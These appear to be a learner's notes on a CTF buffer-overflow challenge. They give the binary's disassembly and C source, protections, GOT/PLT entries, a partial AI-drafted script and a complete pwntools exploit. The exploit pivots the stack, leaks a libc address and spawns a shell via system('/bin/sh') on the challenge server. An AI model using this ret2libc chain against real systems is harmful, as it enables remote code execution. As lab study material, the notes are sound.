# Challenge description
```
This is so BAREbone again... but limited... (overkill bad pun * 3)
nc chal.firebird.sh 35046
```


## Assembly of source the executable
```as
pwndbg> disassemble/r my_read
Dump of assembler code for function my_read:
   0x00000000004006b6 <+0>:     55                      push   rbp
   0x00000000004006b7 <+1>:     48 89 e5                mov    rbp,rsp
   0x00000000004006ba <+4>:     48 83 ec 10             sub    rsp,0x10
   0x00000000004006be <+8>:     48 89 7d f8             mov    QWORD PTR [rbp-0x8],rdi
   0x00000000004006c2 <+12>:    48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004006c6 <+16>:    ba 48 00 00 00          mov    edx,0x48
   0x00000000004006cb <+21>:    48 89 c6                mov    rsi,rax
   0x00000000004006ce <+24>:    bf 00 00 00 00          mov    edi,0x0
   0x00000000004006d3 <+29>:    b8 00 00 00 00          mov    eax,0x0
   0x00000000004006d8 <+34>:    e8 93 fe ff ff          call   0x400570 <read@plt>
   0x00000000004006dd <+39>:    90                      nop
   0x00000000004006de <+40>:    c9                      leave
   0x00000000004006df <+41>:    c3                      ret
End of assembler dump.
pwndbg> disassemble/r bare
Dump of assembler code for function bare:
   0x00000000004006e0 <+0>:     55                      push   rbp
   0x00000000004006e1 <+1>:     48 89 e5                mov    rbp,rsp
   0x00000000004006e4 <+4>:     48 83 ec 20             sub    rsp,0x20
   0x00000000004006e8 <+8>:     8b 05 9e 09 20 00       mov    eax,DWORD PTR [rip+0x20099e]        # 0x60108c <visited>                                                           
   0x00000000004006ee <+14>:    85 c0                   test   eax,eax
   0x00000000004006f0 <+16>:    74 0a                   je     0x4006fc <bare+28>
   0x00000000004006f2 <+18>:    bf 00 00 00 00          mov    edi,0x0
   0x00000000004006f7 <+23>:    e8 a4 fe ff ff          call   0x4005a0 <exit@plt>
   0x00000000004006fc <+28>:    c7 05 86 09 20 00 01 00 00 00   mov    DWORD PTR [rip+0x200986],0x1        # 0x60108c <visited>                                                   
   0x0000000000400706 <+38>:    bf 14 08 40 00          mov    edi,0x400814
   0x000000000040070b <+43>:    e8 50 fe ff ff          call   0x400560 <puts@plt>
   0x0000000000400710 <+48>:    48 8d 45 e0             lea    rax,[rbp-0x20]
   0x0000000000400714 <+52>:    48 89 c7                mov    rdi,rax
   0x0000000000400717 <+55>:    e8 9a ff ff ff          call   0x4006b6 <my_read>
   0x000000000040071c <+60>:    90                      nop
   0x000000000040071d <+61>:    c9                      leave
   0x000000000040071e <+62>:    c3                      ret
End of assembler dump.
pwndbg> disassemble/r main
Dump of assembler code for function main:
   0x000000000040071f <+0>:     55                      push   rbp
   0x0000000000400720 <+1>:     48 89 e5                mov    rbp,rsp
   0x0000000000400723 <+4>:     48 8b 05 46 09 20 00    mov    rax,QWORD PTR [rip+0x200946]        # 0x601070 <stdin@@GLIBC_2.2.5>                                                
   0x000000000040072a <+11>:    b9 00 00 00 00          mov    ecx,0x0
   0x000000000040072f <+16>:    ba 02 00 00 00          mov    edx,0x2
   0x0000000000400734 <+21>:    be 00 00 00 00          mov    esi,0x0
   0x0000000000400739 <+26>:    48 89 c7                mov    rdi,rax
   0x000000000040073c <+29>:    e8 4f fe ff ff          call   0x400590 <setvbuf@plt>
   0x0000000000400741 <+34>:    48 8b 05 18 09 20 00    mov    rax,QWORD PTR [rip+0x200918]        # 0x601060 <stdout@@GLIBC_2.2.5>                                               
   0x0000000000400748 <+41>:    b9 00 00 00 00          mov    ecx,0x0
   0x000000000040074d <+46>:    ba 02 00 00 00          mov    edx,0x2
   0x0000000000400752 <+51>:    be 00 00 00 00          mov    esi,0x0
   0x0000000000400757 <+56>:    48 89 c7                mov    rdi,rax
   0x000000000040075a <+59>:    e8 31 fe ff ff          call   0x400590 <setvbuf@plt>
   0x000000000040075f <+64>:    48 8b 05 1a 09 20 00    mov    rax,QWORD PTR [rip+0x20091a]        # 0x601080 <stderr@@GLIBC_2.2.5>                                               
   0x0000000000400766 <+71>:    b9 00 00 00 00          mov    ecx,0x0
   0x000000000040076b <+76>:    ba 02 00 00 00          mov    edx,0x2
   0x0000000000400770 <+81>:    be 00 00 00 00          mov    esi,0x0
   0x0000000000400775 <+86>:    48 89 c7                mov    rdi,rax
   0x0000000000400778 <+89>:    e8 13 fe ff ff          call   0x400590 <setvbuf@plt>
   0x000000000040077d <+94>:    b8 00 00 00 00          mov    eax,0x0
   0x0000000000400782 <+99>:    e8 59 ff ff ff          call   0x4006e0 <bare>
   0x0000000000400787 <+104>:   b8 00 00 00 00          mov    eax,0x0
   0x000000000040078c <+109>:   5d                      pop    rbp
   0x000000000040078d <+110>:   c3                      ret
End of assembler dump.
```


## C source of the executable 
```c
#include <stdio.h>

int visited = 0;

void my_read(char * buffer) {
    read(0, buffer, 72);
}
void bare() {
    char buf[32];
    if (visited) {
        exit(0);
    }
    visited = 1;
    puts("What is your name?");
    my_read(buf);
}

int main() {
    setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
	setvbuf(stderr,NULL,2,0);
    bare();
    return 0;
}
```


## Solve script template
```py
#!/usr/bin/env python3
# This template is created by ZD (former helper and PWN player) and many more PWN players
# Special thanks to them!
from pwn import *
#----------------------Packing Utils----------------------#
p64 = lambda n: packing.pack(n, 64)
u64 = lambda n: packing.unpack(n, 64)
u32 = lambda n: packing.unpack(n, 32)
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
#---------------------Common Settings---------------------#
bin_path = './UwU' # put the executable name here
local_libc_path = './libc.so.6'
remote_url = 'chal.firebird.sh'
remote_port =  0 # remember to change the port here

context.log_level = 'debug'
context.binary = bin_path

gdb_break_points = [
    # add addresses or symbols or symbol+offset here to set break point automatically
    # e.g. 'main','main+16','0x400500'
]
#---------------------------------------------------------#
#------------------------Exploit--------------------------#
#---------------------------------------------------------#
def initialize_io(mode: str) -> process | remote:
    gdbscripts = "handle SIGALRM ignore\n"
    for bp in gdb_break_points:
        if bp:  # is not empty str
            gdbscripts += f"b* {bp}\n"
    if mode == "_debug":
        # context.terminal = ["tmux", "splitw", "-h"]  
        # uncomment the previous line to use split terminal instead of opening a new terminal
        # this only works if you are using tmux
        return gdb.debug(bin_path, gdbscripts)
    elif mode == "_local":
        return process(bin_path)
    elif mode == "_remote":
        return remote(remote_url, remote_port)
    else:
        exit(-1)
import time
#-----------------------Main Pwn--------------------------#
def do_pwn(io: process | remote) -> None:
    sla = io.sendlineafter
    sa = io.sendafter
    sl = io.sendline
    sd = io.send
    rl = io.recvline
    ru = io.recvuntil
    rc = io.recv
    rop = ROP(bin_path)
    elf = ELF(bin_path)
    # libc = ELF(local_libc_path) # uncomment this line to set libc object 
    def exploit() -> None:
        return # write your solve here
    exploit()
#---------------------------------------------------------#
#--------------------End of Exploit-----------------------#
#---------------------------------------------------------#
def main():
    mode = "_local"
    mode = "_remote"
    mode = "_debug" # comment this line to change from local debugging to remote exploitation
    io = initialize_io(mode)
    do_pwn(io)
    io.interactive()

if __name__ == '__main__':
    main()
#----------------------------EOF---------------------------#
```


I also got this file but I am not sure how to use it or how to even open and read it
```
file Libc    
Libc: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=30773be8cf5bfed9d910c8473dd44eaab2e705ab, for GNU/Linux 2.6.32, stripped
```



> We only get one shot (due to the visited check)

can we not overwrite the variable `visited` as well?

> this suggests ret2libc attack

wht is this? no idea!

> We need to leak a libc address to defeat ASLR

whats it and why do we need to defeat it?

> The actual binary to find PLT/GOT entries
how can I find it

# Protections

```
┌──(kali㉿kali)-[~/Desktop/Bare_Limit]
└─$ checksec --file=program 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols        FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols       No     0               1               program
```

# GOT and PLT entries 
```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/kali/Desktop/Bare_Limit/program:
GOT protection: Partial RELRO | Found 5 GOT entries passing the filter
[0x601018] puts@GLIBC_2.2.5 -> 0x400566 (puts@plt+6) ◂— push 0 /* 'h' */
[0x601020] read@GLIBC_2.2.5 -> 0x400576 (read@plt+6) ◂— push 1
[0x601028] __libc_start_main@GLIBC_2.2.5 -> 0x7ffff7ddcda0 (__libc_start_main) ◂— push r15                                                                                        
[0x601030] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e32f10 (setvbuf) ◂— push r13
[0x601038] exit@GLIBC_2.2.5 -> 0x4005a6 (exit@plt+6) ◂— push 4
pwndbg> plt
Section .plt 0x400550-0x4005b0:
0x400560: puts@plt
0x400570: read@plt
0x400580: __libc_start_main@plt
0x400590: setvbuf@plt
0x4005a0: exit@plt
```

solve script from gpt

```py
#!/usr/bin/env python3
from pwn import *

bin_path = './program'
remote_url = 'chal.firebird.sh'
remote_port = 35046

context.binary = bin_path

def do_pwn(io):
    # Constants from your PLT/GOT
    puts_plt = 0x400560
    puts_got = 0x601018
    main = 0x40071f
    pop_rdi = 0x4007f3 # We need to find a "pop rdi; ret" gadget
    
    # First payload to leak libc
    payload = b"A" * 40  # Buffer + saved rbp
    payload += p64(pop_rdi)  # pop puts_got into rdi
    payload += p64(puts_got) # address to leak
    payload += p64(puts_plt) # call puts
    payload += p64(main)     # return to main
    
    io.recvuntil("What is your name?")
    io.sendline(payload)

def main():
    if args.REMOTE:
        io = remote(remote_url, remote_port)
    else:
        io = process(bin_path)
    
    do_pwn(io)
    io.interactive()

if __name__ == '__main__':
    main()

```


# Actual solve

```py
#!/usr/bin/env python3 

from pwn import * 

elf = ELF("./program")
rop = ROP("./program")


libc = ELF("./libc")

context.binary = elf 

# r = process([elf.path])

# gdb.attach(r)

r = remote("chal.firebird.sh", 35046)

r .recvuntil(b"What is your name?\n")

buf1 = elf.bss() + 0x800
buf2 = elf.bss() + 0x700 

pop_rdi = rop.rdi.address
leave_ret = 0x00000000004006de

payload = flat(
	b'A' * 32,
	buf1,
	
	pop_rdi,
	buf1,
	elf.sym['my_read'],
	
	leave_ret
)

r.send(payload) 

pause()


payload2 = flat(
	buf2,
	
	pop_rdi,
	elf.got['puts'],
	elf.plt["puts"],
	
	pop_rdi,
	buf2,
	elf.sym['my_read'],
	
	leave_ret
	
)

r.send(payload2) 

puts = int.from_bytes(r.recvuntil(b'\x7f'), 'little')

libc.address = puts - libc.sym['puts']

log.info(hex(libc.address))

pause()

payload3 = flat(
	b'A' * 8,
	pop_rdi,
	next(libc.search(b'/bin/sh')),
	
	libc.sym['system'] 
)

r.send(payload3)


r.interactive()
```

when i watch the video explanation of the above after some days of just a few (like 3) buffer overflow challenges, it doesn't seem to be terrifying at all